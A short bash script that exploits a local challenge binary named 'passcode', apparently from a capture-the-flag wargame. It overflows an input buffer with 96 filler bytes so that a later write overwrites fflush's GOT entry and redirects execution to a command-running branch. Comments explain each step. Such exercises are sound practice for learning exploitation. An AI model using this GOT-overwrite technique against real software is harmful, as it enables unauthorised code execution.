#!/bin/bash 


FILL=$(printf "i%0.s" {1..96}) # random string to fill the array until we reach the address
ADR_TARGET=$'\x14\xc0\x04\x08' # the address of the variable that contains the real address of the fflush function
ADR_VALUE=$((0x804928f))       # convert the address function line inside the if statement that will run the command 

./passcode << EOF 
$FILL$ADR_TARGET
$ADR_VALUE
EOF
